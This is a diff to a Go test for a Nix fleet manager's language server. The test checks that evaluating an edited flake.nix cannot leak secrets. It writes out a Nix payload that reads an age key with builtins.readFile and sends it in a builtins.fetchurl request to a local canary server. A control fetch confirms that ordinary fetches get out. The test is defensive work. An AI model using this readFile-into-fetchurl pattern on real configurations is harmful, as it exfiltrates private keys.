@@ -15,7 +15,7 @@ import (
 	"slices"
 	"strconv"
 	"strings"
-	"sync/atomic"
+	"sync"
 	"syscall"
 	"testing"
 	"testing/fstest"
@@ -528,12 +528,19 @@ func TestLanguageServerIsPureWithRealNix(t *testing.T) {
 	if os.Getenv("NIXMGR_NIX_TESTS") == "" {
 		t.Skip("needs real Nix and nixd: set NIXMGR_NIX_TESTS=1")
 	}
-	var leaks atomic.Int32
+	var mu sync.Mutex
+	var requests []string
 	canary := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		leaks.Add(1)
-		t.Logf("request from fleet code: %s", r.URL.Path)
+		mu.Lock()
+		defer mu.Unlock()
+		requests = append(requests, r.URL.Path)
 	}))
 	defer canary.Close()
+	got := func() string {
+		mu.Lock()
+		defer mu.Unlock()
+		return strings.Join(requests, " ")
+	}
 	key := filepath.Join(t.TempDir(), "sops-age-key")
 	if err := os.WriteFile(key, []byte("AGE-SECRET-KEY-1TEST"), 0o600); err != nil {
 		t.Fatal(err)
@@ -563,14 +570,25 @@ func TestLanguageServerIsPureWithRealNix(t *testing.T) {
 	if got := complete(t, openEditor(t, e)); !slices.Contains(got, "canary") {
 		t.Fatalf("completions from the fleet's options: %q", got)
 	}
-	// What an edit token can write: not committed, and nobody reads an error.
-	leak := `builtins.seq (builtins.fetchurl "` + canary.URL + `/${builtins.readFile "` + key + `"}") ` + configs
-	if _, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+leak+`; `+others+` }; }`, hash); err != nil {
+	// What an edit token can write: not committed, and nobody reads an error. With a
+	// hash pure mode fetches, so only the forbidden read can stop the key going out.
+	fetching := func(path string) string {
+		fetch := `builtins.fetchurl { url = "` + canary.URL + path + `"; sha256 = "` + strings.Repeat("0", 52) + `"; }`
+		return `{ outputs = _: { nixosConfigurations = builtins.seq (` + fetch + `) ` + configs + `; ` + others + ` }; }`
+	}
+	if hash, err = e.svc.Write("flake.nix", fetching("/control"), hash); err != nil {
 		t.Fatal(err)
 	}
-	openEditor(t, e) // the fetch would be part of the evaluation openEditor waits for
-	if n := leaks.Load(); n != 0 {
-		t.Fatalf("fleet code read the age key and sent it out (%d requests)", n)
+	openEditor(t, e) // a fetch is part of the evaluation openEditor waits for
+	if r := got(); r != "/control" {
+		t.Fatalf("a fetch from fleet code should get out: %q", r)
+	}
+	if _, err := e.svc.Write("flake.nix", fetching(`/${builtins.readFile "`+key+`"}`), hash); err != nil {
+		t.Fatal(err)
+	}
+	openEditor(t, e)
+	if r := got(); r != "/control" {
+		t.Fatalf("fleet code read the age key and sent it out: %q", r)
 	}
 }
 
